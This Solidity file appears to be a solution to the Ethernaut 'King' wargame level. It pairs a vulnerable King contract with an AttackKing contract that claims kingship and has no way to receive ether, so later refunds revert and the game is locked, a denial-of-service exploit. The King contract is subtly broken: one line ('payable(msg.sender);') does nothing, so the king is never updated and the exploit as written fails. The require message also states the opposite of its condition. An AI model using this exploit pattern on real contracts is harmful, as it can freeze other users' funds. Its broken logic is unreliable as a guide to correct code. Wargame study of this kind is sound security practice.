// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = payable(msg.sender);  
    king = payable(msg.sender);
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    payable(msg.sender);
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}


contract AttackKing {

    King private kingContract;

    constructor (address _kingAddress) public{
        kingContract = King(payable(_kingAddress));
    }

    function getPrize() public view returns(uint prize){
       prize =  kingContract.prize();
    }

    function becomeKing(address _kingAddress) payable public {
        (bool success, ) = address(kingContract).call{value: msg.value}("");
        require(success, "transaction was successful");
    }
}


